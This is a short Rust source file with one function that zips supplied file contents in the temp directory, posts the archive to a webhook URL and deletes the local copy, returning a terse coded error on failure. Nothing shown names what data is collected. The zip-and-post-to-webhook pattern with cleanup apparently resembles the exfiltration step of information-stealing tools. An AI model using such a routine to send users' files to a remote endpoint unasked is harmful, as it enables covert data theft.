use std::{env, fs, io::Write};
use zip::write::FileOptions;

#[allow(dead_code)]
pub async fn send_zip(
    client: &reqwest::Client,
    webhook_url: &str,
    files: &[(String, String)],
    zip_filename: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    if files.is_empty() {
        return Ok(());
    }

    let zip_path = env::temp_dir().join(zip_filename);

    {
        let file = fs::File::create(&zip_path)?;
        let mut zip = zip::ZipWriter::new(file);
        let options = FileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);

        for (name, content) in files {
            zip.start_file(name, options)?;
            zip.write_all(content.as_bytes())?;
        }

        zip.finish()?;
    }

    let zip_data = fs::read(&zip_path)?;

    let part = reqwest::multipart::Part::bytes(zip_data)
        .file_name(zip_filename.to_string())
        .mime_str("application/zip")?;

    let form = reqwest::multipart::Form::new().part("file", part);

    let response = client.post(webhook_url).multipart(form).send().await?;
    let status = response.status();
    let _body = response.text().await.unwrap_or_default();
    if !status.is_success() {
        return Err("e60".into());
    }

    let _ = fs::remove_file(&zip_path);

    Ok(())
}
